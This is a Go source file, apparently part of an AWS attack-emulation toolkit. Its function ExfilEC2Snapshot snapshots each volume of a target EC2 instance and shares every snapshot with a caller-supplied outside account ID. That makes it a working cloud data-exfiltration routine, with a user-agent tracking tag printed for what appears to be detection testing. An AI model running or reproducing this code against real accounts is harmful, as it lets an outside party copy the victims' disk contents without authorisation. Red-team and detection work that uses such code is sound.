package awsdata

import (
	"fmt"

	"github.com/aws/aws-sdk-go/aws/session"
)

func ExfilEC2Snapshot(sess *session.Session, instanceid string, accountid string, t string) {
	rando := SetTrackingAction(t, "ec2Snapshot-exfil")

	volumes := DescribeVolumes(sess, instanceid)
	for _, v := range volumes.Volumes {
		snapshot := CreateSnapshot(sess, *v.VolumeId)
		fmt.Println("Snapshot ID: " + *snapshot.SnapshotId)
		fmt.Println("https://console.aws.amazon.com/ec2/v2/home?region=us-east-1#Snapshots:visibility=private;sort=snapshotId\n")
		ModifySnapshotAttribute(sess, *snapshot.SnapshotId, accountid)
	}

	fmt.Println("UA Tracking: exec-env/" + rando)
}
